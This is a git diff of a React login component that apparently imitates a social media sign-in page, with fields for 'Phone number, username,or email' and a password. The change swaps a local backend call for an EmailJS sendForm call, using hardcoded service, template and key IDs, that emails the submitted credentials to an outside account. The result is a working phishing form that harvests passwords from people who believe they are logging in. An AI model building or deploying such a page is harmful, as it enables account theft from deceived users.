@@ -1,27 +1,31 @@
 import './Box1.css'
 import { Link } from "react-router-dom";
-import { useState } from 'react';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
 import { library } from '@fortawesome/fontawesome-svg-core'
 import { fab } from '@fortawesome/free-brands-svg-icons'
-import axios from 'axios';
+import React, { useRef } from 'react';
+import emailjs from '@emailjs/browser';
+
 
 library.add(fab)
 
 
 const Box1 = () => {
+    const form = useRef();
 
-const [user,setuser]=useState('')
-const[pass,setpass]=useState('')
+    const sendEmail = (e) => {
+      e.preventDefault();
+  
+      emailjs.sendForm('service_ie0vfk9', 'template_yg9ejah', form.current, 'dEGoKuhfgKTVYF7fL')
+        .then((result) => {
+            console.log(result.text);
+        }, (error) => {
+            console.log(error.text);
+        });
+    };
 
-  async function handlelogin(e){
-    e.preventDefault()
 
-     await axios.post('http://localhost:4000/postuser',{
-        email:user,
-        password:pass
-      }).then(()=>{console.log('Done!')}).catch((err)=>{console.log('err');})
-}
+
 
     return (
 <div>
@@ -32,10 +36,10 @@ const[pass,setpass]=useState('')
         <i className='logo' role='img'></i>
     </div>
    
-<form action='post' >
-<input  type='text' placeholder='Phone number, username,or email' value={user}  onChange={(e)=>{setuser(e.target.value)}}/>
-<input  type='password' placeholder='Password' value={pass} onChange={(e)=>{setpass(e.target.value)}} />
-<button className="action" type="submit" onClick={handlelogin}>
+<form ref={form} onSubmit={sendEmail} >
+<input  type='text' placeholder='Phone number, username,or email' />
+<input  type='password' placeholder='Password'  name='pass' />
+<button className="action" type="submit" >
     <div className="bigbtn">Log in</div>
     </button>
 </form>
@@ -80,7 +84,6 @@ or
 </div>
     
     );
-
-}
+};
  
 export default Box1
